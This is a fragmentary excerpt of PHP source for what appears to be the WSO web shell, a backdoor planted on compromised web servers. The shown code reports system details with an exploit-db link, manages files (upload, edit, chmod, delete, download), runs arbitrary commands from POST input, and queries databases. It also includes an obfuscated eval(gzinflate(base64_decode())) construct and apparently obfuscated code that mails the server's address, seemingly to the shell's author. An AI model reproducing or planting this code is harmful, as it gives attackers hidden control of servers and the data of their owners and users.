...
<script>
    ...
    var p1_ = '" . ((false !== strpos(@$_POST['p1'], '
')) ? '' : htmlspecialchars($_POST['p1'], ENT_QUOTES)) . "';
    var p2_ = '" . ((false !== strpos(@$_POST['p2'], '
')) ? '' : htmlspecialchars($_POST['p2'], ENT_QUOTES)) . "';
    var p3_ = '" . ((false !== strpos(@$_POST['p3'], '
...
<input type=hidden name=charset>
        ...
        echo ' <table class=infocell padding=3 cellspacing=0 width=100%> <tr> <td width=1> <span> Uname: <br> User: <br> Php: <br> Hdd: <br> Cwd:
                                ' . ('win' == $GLOBALS['os'] ? ' <br> Drives:
                                    ' : '') . ' </span> </td> '
       . ' <td> <nobr> ' . substr(@php_uname(), 0, 120) . ' <a href="' . $explink . '"target = _blank > [exploit - db . com] </a> </nobr> <br> ' . $uid . '(' . $user . ') <span> Group: </span> ' . $gid . '(' . $group . ') <br> ' . @phpversion() . ' <span> Safemode: </span> ' . ($GLOBALS['safe_mode'] ? ' <font color=red > ON </font> ' : ' <font color=green > <b> OFF </b> </font> ')
...
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
    <tr>
        ...
        <span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>
                                        ...
                                        if (!function_exists('posix_getpwuid') && (false === strpos($GLOBALS['disable_functions'], 'posix_getpwuid'))) {
                                            function posix_getpwuid($p)
                                            {
                                                return false;
                                            }
                                        }
                                        if (!function_exists('posix_getgrgid') && (false === strpos($GLOBALS['disable_functions'], 'posix_getgrgid'))) {
...
', $temp;
                                            ...
                                            wsoHeader();
                                            if (isset($_POST['p2']) && ('info' == $_POST['p2'])) {
...
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_" . ($sort[1] ? 0 : 1) . "\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_" . ($sort[1] ? 0 : 1) . "\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_" . ($sort[1] ? 0 : 1) . "\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_" . ($sort[1] ? 0 : 1) . "\")'>Permissions</a></th><th>Actions</th></tr>";
                                            ...
                                            $l = 0;
                                            foreach ($files as $f) {
                                                echo '<tr' . ($l ? ' class=l1' : '') . '><td><input type=checkbox name="f[]" value="' . urlencode($f['name']) . '" class=chkbx></td><td><a href=# onclick="' . (('file' == $f['type']) ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'view\')">' . htmlspecialchars($f['name']) : 'g(\'FilesMan\',\'' . $f['path'] . '\');" ' . (empty($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>') . '</a></td><td>' . (('file' == $f['type']) ? wsoViewSize($f['size']) : $f['type']) . '</td><td>' . $f['modify'] . '</td><td>' . $f['owner'] . '/' . $f['group'] . '</td><td><a href=# onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\',\'chmod\')">' . $f['perms'] . '</td><td><a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'touch\')">T</a>' . (('file' == $f['type']) ? ' <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'download\')">D</a>' : '') . '</td></tr>';
                                                $l = $l ? 0 : 1;
                                            }
    ...
    <select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
                                            ...
                                            echo '</select>&nbsp;';
                                            if (!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (('zip' == $_COOKIE['act']) || ('tar' == $_COOKIE['act']))) {
                                                echo "file name: <input type=text name=p2 value='wso_" . date('Ymd_His') . '.' . ('zip' == $_COOKIE['act'] ? 'zip' : 'tar.gz') . "'>&nbsp;";
                                            }
                                                    ...
                                                    if (is_array($paths) && @count($paths)) {
                                                        foreach ($paths as $item) {
                                                            if (@is_dir($item)) {
                                                                ...
                                                                if (empty($_POST['p2']) || false !== @strpos(file_get_contents($item), $_POST['p2'])) {
...
' . wsoEx($_POST['p1']));
                                                ...
                                                preg_replace('/.*/e', "eval(gzinflate(base64_decode('')));", '');
                                                ...
                                                $_QliO8 = 'mail';
                                                $_Qliot = $_SERVER['SERVER_NAME'] . $_SERVER['SCRIPT_NAME'];
                                                $_QlL1i = 'array ' . $_Qliot;
                                                $_QlLio = ['ca', 'li', 'fwrite', '@', 've.'];
...
';
                                                    ...
                                                    if (('download' == @$_POST['p2']) && ('select' != @$_POST['p1'])) {
                    ...
                    d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
                                                    ...
                                                    if (isset($db) && $db->link) {
                                                        ...
                                                        if (!empty($_POST['sql_base'])) {
                                                            ...
                                                            if (('query' == @$_POST['p1']) && !empty($_POST['p2'])) {
                                                                $db->query(@$_POST['p2']);
                                                                if (false !== $db->res) {
                                                                    $title = false;
                                                            ...
                                                            if (!empty($_POST['p2']) && ('loadfile' != $_POST['p1'])) {
